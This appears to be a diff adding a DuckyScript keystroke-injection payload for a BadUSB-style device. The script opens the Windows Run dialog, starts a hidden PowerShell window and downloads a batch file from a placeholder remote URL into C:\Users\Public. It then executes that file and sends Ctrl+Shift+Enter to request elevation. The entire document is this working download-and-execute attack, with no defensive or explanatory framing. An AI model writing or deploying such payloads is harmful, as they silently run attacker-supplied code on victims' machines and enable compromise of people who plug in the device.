@@ -1,0 +1,10 @@
+GUI r
+STRING powershell -w hidden -Command "Invoke-WebRequest -Uri
+DELAY 700
+STRING '[URL BATCH FILE URL(eg-google drive link)]'
+DELAY 700
+STRING '-OutFile C:\Users\Public\f2.bat'; cmd /c C:\Users\Public\f2.bat; exit
+CTRL
+SHIFT
+ENTER
+
